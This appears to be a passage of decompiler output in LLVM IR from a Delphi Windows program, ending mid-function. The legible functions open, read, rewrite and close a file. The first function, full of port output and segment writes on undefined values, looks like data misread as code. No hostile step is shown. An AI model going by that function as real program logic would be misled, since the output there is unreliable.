define i32 @function_406d65(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406d65:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1663
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1663
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1663
  %9 = add i8 %6, %8, !insn.addr !1663
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1663
  store i8 %9, i8* %10, align 1, !insn.addr !1663
  %11 = load i32, i32* %eax, align 4, !insn.addr !1664
  %12 = add i32 %11, 114, !insn.addr !1664
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1664
  %14 = load i8, i8* %13, align 1, !insn.addr !1664
  %15 = udiv i32 %2, 256, !insn.addr !1664
  %16 = trunc i32 %15 to i8, !insn.addr !1664
  %17 = add i8 %14, %16, !insn.addr !1664
  store i8 %17, i8* %13, align 1, !insn.addr !1664
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1665
  %20 = add i8 %19, -32, !insn.addr !1665
  %21 = icmp ult i8 %19, 32, !insn.addr !1665
  %22 = icmp eq i8 %20, 0, !insn.addr !1665
  %23 = zext i8 %20 to i32, !insn.addr !1665
  %24 = and i32 %18, -256, !insn.addr !1665
  %25 = or i32 %24, %23, !insn.addr !1665
  store i32 %25, i32* %eax, align 4, !insn.addr !1665
  %26 = or i1 %21, %22, !insn.addr !1666
  br i1 %26, label %dec_label_pc_406d6e, label %dec_label_pc_406ddd, !insn.addr !1666

dec_label_pc_406d6e:                              ; preds = %dec_label_pc_406d65
  %27 = add i32 %25, 105, !insn.addr !1667
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1667
  %29 = load i8, i8* %28, align 1, !insn.addr !1667
  %30 = and i8 %29, %16, !insn.addr !1667
  store i8 %30, i8* %28, align 1, !insn.addr !1667
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1668
  store i32 %31, i32* %eax, align 4, !insn.addr !1668
  %32 = trunc i32 %arg3 to i16, !insn.addr !1669
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1669
  %34 = load i8, i8* %33, align 1, !insn.addr !1669
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1669
  %35 = add i32 %arg5, 105, !insn.addr !1670
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1670
  %38 = load i8, i8* %37, align 1, !insn.addr !1670
  %39 = udiv i32 %arg2, 256, !insn.addr !1670
  %40 = trunc i32 %39 to i8, !insn.addr !1670
  %41 = and i8 %38, %40, !insn.addr !1670
  store i8 %41, i8* %37, align 1, !insn.addr !1670
  %42 = mul i32 %arg5, 2, !insn.addr !1671
  %43 = add i32 %arg2, 115, !insn.addr !1671
  %44 = add i32 %43, %42, !insn.addr !1671
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1671
  %46 = load i8, i8* %45, align 1, !insn.addr !1671
  %47 = trunc i32 %arg2 to i8, !insn.addr !1671
  %48 = add i8 %46, %47, !insn.addr !1671
  %49 = icmp eq i8 %48, 0, !insn.addr !1671
  store i8 %48, i8* %45, align 1, !insn.addr !1671
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1672
  br i1 %49, label %dec_label_pc_406dbf, label %dec_label_pc_406d7d, !insn.addr !1672

dec_label_pc_406d7d:                              ; preds = %dec_label_pc_406d6e
  %50 = icmp slt i8 %48, 0, !insn.addr !1671
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1673
  %52 = load i32, i32* %51, align 4, !insn.addr !1673
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1673
  br i1 %50, label %dec_label_pc_406df4, label %dec_label_pc_406d82, !insn.addr !1674

dec_label_pc_406d82:                              ; preds = %dec_label_pc_406d7d
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1675
  %55 = add i8 %54, -32, !insn.addr !1675
  %56 = icmp ult i8 %54, 32, !insn.addr !1675
  %57 = icmp eq i8 %55, 0, !insn.addr !1675
  %58 = zext i8 %55 to i32, !insn.addr !1675
  %59 = and i32 %53, -256, !insn.addr !1675
  %60 = or i32 %59, %58, !insn.addr !1675
  store i32 %60, i32* %eax, align 4, !insn.addr !1675
  %61 = or i1 %56, %57, !insn.addr !1676
  br i1 %61, label %dec_label_pc_406d86, label %dec_label_pc_406df5, !insn.addr !1676

dec_label_pc_406d86:                              ; preds = %dec_label_pc_406d82
  %62 = add i32 %arg2, 105, !insn.addr !1677
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1677
  %64 = load i8, i8* %63, align 1, !insn.addr !1677
  %65 = udiv i32 %53, 256, !insn.addr !1677
  %66 = trunc i32 %65 to i8, !insn.addr !1677
  %67 = and i8 %64, %66, !insn.addr !1677
  store i8 %67, i8* %63, align 1, !insn.addr !1677
  %68 = add i32 %arg6, 105, !insn.addr !1678
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1678
  %70 = load i8, i8* %69, align 1, !insn.addr !1678
  %71 = and i8 %70, %40, !insn.addr !1678
  store i8 %71, i8* %69, align 1, !insn.addr !1678
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1679
  %74 = load i8, i8* %73, align 1, !insn.addr !1679
  %75 = trunc i32 %72 to i8, !insn.addr !1679
  %76 = add i8 %74, %75, !insn.addr !1679
  store i8 %76, i8* %73, align 1, !insn.addr !1679
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1680
  %79 = load i8, i8* %78, align 1, !insn.addr !1680
  %80 = trunc i32 %77 to i8, !insn.addr !1680
  %81 = add i8 %79, %80, !insn.addr !1680
  store i8 %81, i8* %78, align 1, !insn.addr !1680
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1681
  %83 = load i32, i32* %82, align 4, !insn.addr !1681
  %84 = add i32 %83, %arg6, !insn.addr !1681
  store i32 %84, i32* %82, align 4, !insn.addr !1681
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1682
  %87 = load i8, i8* %86, align 1, !insn.addr !1682
  %88 = trunc i32 %85 to i8, !insn.addr !1682
  %89 = add i8 %87, %88, !insn.addr !1682
  store i8 %89, i8* %86, align 1, !insn.addr !1682
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1683
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1684
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1684
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1684
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1685
  %92 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1686
  %93 = add i32 %92, 1, !insn.addr !1686
  %94 = icmp eq i32 %93, 0, !insn.addr !1686
  store i32 %93, i32* @global_var_4096dc, align 4, !insn.addr !1686
  %95 = icmp eq i1 %94, false, !insn.addr !1687
  br i1 %95, label %dec_label_pc_406db7, label %dec_label_pc_406dad, !insn.addr !1687

dec_label_pc_406dad:                              ; preds = %dec_label_pc_406d86
  %96 = call i32 @"@LStrClr"(), !insn.addr !1688
  br label %dec_label_pc_406db7, !insn.addr !1688

dec_label_pc_406db7:                              ; preds = %dec_label_pc_406dad, %dec_label_pc_406d86
  store i32 0, i32* %eax, align 4, !insn.addr !1689
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1690
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1691
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1691
  br label %dec_label_pc_406dbf, !insn.addr !1691

dec_label_pc_406dbf:                              ; preds = %dec_label_pc_406db7, %dec_label_pc_406d6e
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1692
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1692
  store i32 4222412, i32* %99, align 4, !insn.addr !1692
  %100 = load i32, i32* %eax, align 4, !insn.addr !1693
  ret i32 %100, !insn.addr !1693

dec_label_pc_406ddd:                              ; preds = %dec_label_pc_406d65
  %101 = mul i32 %4, 2, !insn.addr !1694
  %102 = add i32 %1, 105, !insn.addr !1694
  %103 = add i32 %102, %101, !insn.addr !1694
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1694
  %105 = load i32, i32* %104, align 4, !insn.addr !1694
  %106 = or i32 %105, %3, !insn.addr !1694
  store i32 %106, i32* %104, align 4, !insn.addr !1694
  %107 = add i32 %0, -1, !insn.addr !1695
  %108 = trunc i32 %3 to i16, !insn.addr !1696
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1696
  %110 = load i32, i32* %109, align 4, !insn.addr !1696
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1696
  %111 = load i32, i32* %eax, align 4, !insn.addr !1697
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1697
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1697
  %115 = or i8 %112, %114, !insn.addr !1697
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1697
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1698
  %118 = load i8, i8* %117, align 1, !insn.addr !1698
  %119 = trunc i32 %116 to i8, !insn.addr !1698
  %120 = add i8 %118, %119, !insn.addr !1698
  store i8 %120, i8* %117, align 1, !insn.addr !1698
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1699
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1699
  %124 = load i8, i8* %123, align 1, !insn.addr !1699
  %125 = add i8 %124, %122, !insn.addr !1699
  %126 = zext i8 %125 to i32, !insn.addr !1699
  %127 = and i32 %121, -256, !insn.addr !1699
  %128 = or i32 %127, %126, !insn.addr !1699
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1700
  %130 = load i8, i8* %129, align 1, !insn.addr !1700
  %131 = trunc i32 %3 to i8, !insn.addr !1701
  %132 = add i8 %125, %131, !insn.addr !1700
  %133 = add i8 %132, %130, !insn.addr !1701
  store i8 %133, i8* %129, align 1, !insn.addr !1701
  %134 = add i32 %128, 1, !insn.addr !1702
  store i32 %134, i32* %eax, align 4, !insn.addr !1702
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1703
  %136 = load i8, i8* %135, align 1, !insn.addr !1703
  %137 = trunc i32 %134 to i8, !insn.addr !1703
  %138 = add i8 %136, %137, !insn.addr !1703
  store i8 %138, i8* %135, align 1, !insn.addr !1703
  br label %dec_label_pc_406df4, !insn.addr !1703

dec_label_pc_406df4:                              ; preds = %dec_label_pc_406ddd, %dec_label_pc_406d7d
  %139 = load i32, i32* %eax, align 4, !insn.addr !1703
  ret i32 %139, !insn.addr !1703

dec_label_pc_406df5:                              ; preds = %dec_label_pc_406d82
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1704
  %141 = load i8, i8* %140, align 1, !insn.addr !1704
  %142 = add i8 %141, %55, !insn.addr !1704
  store i8 %142, i8* %140, align 1, !insn.addr !1704
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1705
  %145 = load i8, i8* %144, align 1, !insn.addr !1705
  %146 = trunc i32 %arg3 to i8, !insn.addr !1705
  %147 = add i8 %145, %146, !insn.addr !1705
  store i8 %147, i8* %144, align 1, !insn.addr !1705
  %148 = load i32, i32* %eax, align 4, !insn.addr !1706
  %149 = add i32 %148, 1, !insn.addr !1706
  %150 = mul i32 %149, 2, !insn.addr !1707
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1707
  %152 = load i8, i8* %151, align 2, !insn.addr !1707
  %153 = trunc i32 %149 to i8, !insn.addr !1707
  %154 = add i8 %152, %153, !insn.addr !1707
  store i8 %154, i8* %151, align 2, !insn.addr !1707
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1708
  %156 = load i8, i8* %155, align 1, !insn.addr !1708
  %157 = add i8 %156, %153, !insn.addr !1708
  store i8 %157, i8* %155, align 1, !insn.addr !1708
  ret i32 %149, !insn.addr !1709
}

define i32 @function_406e20() local_unnamed_addr {
dec_label_pc_406e20:
  %esp.1.reg2mem = alloca i32, !insn.addr !1710
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1711
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1711
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1711
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1712
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1713
  %3 = call i32 @function_4036c8(), !insn.addr !1714
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1715
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1715
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1715
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1716
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1717
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1718
  br i1 %7, label %dec_label_pc_406fbf, label %dec_label_pc_406e8a, !insn.addr !1718

dec_label_pc_406e8a:                              ; preds = %dec_label_pc_406e20
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1716
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1719
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1719
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1720
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1721
  br i1 %12, label %dec_label_pc_406fbf, label %dec_label_pc_406ea6, !insn.addr !1721

dec_label_pc_406ea6:                              ; preds = %dec_label_pc_406e8a
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1722
  %14 = call i32 @function_403720(), !insn.addr !1723
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1724
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1724
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1725
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1725
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1726
  %19 = call i32 @function_4046d4(), !insn.addr !1727
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406fbf

dec_label_pc_406fbf:                              ; preds = %dec_label_pc_406ea6, %dec_label_pc_406e8a, %dec_label_pc_406e20
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1728
  %21 = load i32, i32* %20, align 4, !insn.addr !1728
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1729
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1730
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1730
  store i32 4222945, i32* %23, align 4, !insn.addr !1730
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1731
  ret i32 %24, !insn.addr !1732
}

define i32 @function_406fda() local_unnamed_addr {
dec_label_pc_406fda:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1733
  ret i32 %0, !insn.addr !1733
}

define i32 @function_406fdf() local_unnamed_addr {
dec_label_pc_406fdf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1734
}

define i32 @function_406fe1(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406fe1:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1735
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1735
  %3 = load i32, i32* %2, align 4, !insn.addr !1735
  ret i32 %3, !insn.addr !1736
}

define i32 @function_407018() local_unnamed_addr {
dec_label_pc_407018:
  %esp.2.reg2mem = alloca i32, !insn.addr !1737
  %esp.1.reg2mem = alloca i32, !insn.addr !1737
  %esi.0.reg2mem = alloca i32, !insn.addr !1737
  %esp.0.reg2mem = alloca i32, !insn.addr !1737
  %ebx.0.reg2mem = alloca i32, !insn.addr !1737
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1738
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1739
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1739
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1739
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1740
  %2 = call i32 @function_403c88(), !insn.addr !1741
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1742
  br i1 %3, label %dec_label_pc_407101, label %dec_label_pc_407046, !insn.addr !1742

dec_label_pc_407046:                              ; preds = %dec_label_pc_407018
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1743
  %5 = call i32 @function_4036c8(), !insn.addr !1744
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1745
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1745
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1745
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1746
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1747
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1748
  br i1 %9, label %dec_label_pc_407101, label %dec_label_pc_407082, !insn.addr !1748

dec_label_pc_407082:                              ; preds = %dec_label_pc_407046
  %10 = call i32 @"@LStrClr"(), !insn.addr !1749
  %11 = call i32 @function_403c90(), !insn.addr !1750
  %12 = icmp slt i32 %11, 0, !insn.addr !1751
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1752
  br i1 %12, label %dec_label_pc_4070cc, label %dec_label_pc_40709a, !insn.addr !1752

dec_label_pc_40709a:                              ; preds = %dec_label_pc_407082
  %13 = add i32 %11, 1, !insn.addr !1753
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1754
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1754
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1754
  br label %dec_label_pc_40709d, !insn.addr !1754

dec_label_pc_40709d:                              ; preds = %dec_label_pc_40709d, %dec_label_pc_40709a
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1755
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1755
  store i32 0, i32* %15, align 4, !insn.addr !1755
  %16 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1756
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1757
  %18 = add i32 %16, %17, !insn.addr !1757
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1757
  %20 = load i32, i32* %19, align 4, !insn.addr !1757
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1757
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1757
  store i32 %20, i32* %22, align 4, !insn.addr !1757
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1758
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1758
  store i32 ptrtoint (i32* @global_var_407148 to i32), i32* %24, align 4, !insn.addr !1758
  %25 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1759
  %26 = or i32 %17, 4, !insn.addr !1760
  %27 = add i32 %25, %26, !insn.addr !1760
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1760
  %29 = load i32, i32* %28, align 4, !insn.addr !1760
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1760
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1760
  store i32 %29, i32* %31, align 4, !insn.addr !1760
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1761
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1761
  store i32 ptrtoint ([3 x i8]* @global_var_407154 to i32), i32* %33, align 4, !insn.addr !1761
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1762
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1763
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1764
  %37 = icmp eq i32 %36, 0, !insn.addr !1764
  %38 = icmp eq i1 %37, false, !insn.addr !1765
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1765
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1765
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1765
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1765
  br i1 %38, label %dec_label_pc_40709d, label %dec_label_pc_4070cc, !insn.addr !1765

dec_label_pc_4070cc:                              ; preds = %dec_label_pc_40709d, %dec_label_pc_407082
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1746
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1766
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1767
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1767
  store i32 0, i32* %42, align 4, !insn.addr !1767
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1768
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1768
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1768
  store i32 %45, i32* %44, align 4, !insn.addr !1768
  %46 = call i32 @function_4034c8(), !insn.addr !1769
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1770
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1770
  store i32 %46, i32* %48, align 4, !insn.addr !1770
  %49 = call i32 @function_403720(), !insn.addr !1771
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1772
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1772
  store i32 %49, i32* %51, align 4, !insn.addr !1772
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1773
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1773
  store i32 %39, i32* %53, align 4, !insn.addr !1773
  %54 = call i32 @function_40446c(), !insn.addr !1774
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1775
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1775
  store i32 %39, i32* %56, align 4, !insn.addr !1775
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1776
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1777
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1777
  store i32 %39, i32* %59, align 4, !insn.addr !1777
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1778
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1779
  br label %dec_label_pc_407101, !insn.addr !1779

dec_label_pc_407101:                              ; preds = %dec_label_pc_4070cc, %dec_label_pc_407046, %dec_label_pc_407018
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1780
  %62 = load i32, i32* %61, align 4, !insn.addr !1780
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1781
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1782
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1782
  store i32 4223267, i32* %64, align 4, !insn.addr !1782
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1783
  ret i32 %65, !insn.addr !1784
}

define i32 @function_40711c() local_unnamed_addr {
dec_label_pc_40711c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1785
  ret i32 %0, !insn.addr !1785
}

define i32 @function_407121() local_unnamed_addr {
dec_label_pc_407121:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1786
}

define i32 @function_407123(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407123:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1787
}

define i32 @function_407158() local_unnamed_addr {
dec_label_pc_407158:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1788
  %1 = call i32 @function_4036b8(), !insn.addr !1789
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1790
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1790
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1790
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1791
  %4 = call i32 @function_403c90(), !insn.addr !1792
  %5 = icmp slt i32 %4, 0, !insn.addr !1793
  br i1 %5, label %dec_label_pc_4071e0, label %dec_label_pc_4071ae, !insn.addr !1794

dec_label_pc_4071ae:                              ; preds = %dec_label_pc_407158
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1795
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1796
  br label %dec_label_pc_40722c

dec_label_pc_4071e0:                              ; preds = %dec_label_pc_407158
  %8 = call i32 @function_403c88(), !insn.addr !1797
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1798
  %10 = call i32 @function_403c90(), !insn.addr !1799
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1800
  %12 = call i32 @function_403c90(), !insn.addr !1801
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1802
  %14 = call i32 @function_407018(), !insn.addr !1803
  br label %dec_label_pc_40722c, !insn.addr !1803

dec_label_pc_40722c:                              ; preds = %dec_label_pc_4071ae, %dec_label_pc_4071e0
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1804
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1805
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1806
  ret i32 %16, !insn.addr !1807
}

define i32 @function_407247() local_unnamed_addr {
dec_label_pc_407247:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1808
  ret i32 %0, !insn.addr !1808
}

define i32 @function_40724c() local_unnamed_addr {
dec_label_pc_40724c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1809
}

define i32 @function_40724e(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40724e:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1810
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1810
  %3 = load i32, i32* %2, align 4, !insn.addr !1810
  ret i32 %3, !insn.addr !1811
}

define i32 @function_407258() local_unnamed_addr {
dec_label_pc_407258:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1812
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1812
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1812
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1813
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1814
  %3 = add i32 %2, 1, !insn.addr !1814
  %4 = icmp eq i32 %3, 0, !insn.addr !1814
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !1814
  %5 = icmp eq i1 %4, false, !insn.addr !1815
  br i1 %5, label %dec_label_pc_407290, label %dec_label_pc_407271, !insn.addr !1815

dec_label_pc_407271:                              ; preds = %dec_label_pc_407258
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1816
  %7 = icmp eq i32 %6, 0, !insn.addr !1816
  br i1 %7, label %dec_label_pc_407280, label %dec_label_pc_40727b, !insn.addr !1817

dec_label_pc_40727b:                              ; preds = %dec_label_pc_407271
  %8 = call i32 @function_407018(), !insn.addr !1818
  br label %dec_label_pc_407280, !insn.addr !1818

dec_label_pc_407280:                              ; preds = %dec_label_pc_40727b, %dec_label_pc_407271
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1819
  br label %dec_label_pc_407290, !insn.addr !1819

dec_label_pc_407290:                              ; preds = %dec_label_pc_407280, %dec_label_pc_407258
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1820
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1821
  ret i32 0, !insn.addr !1822
}

define i32 @function_40729e() local_unnamed_addr {
dec_label_pc_40729e:
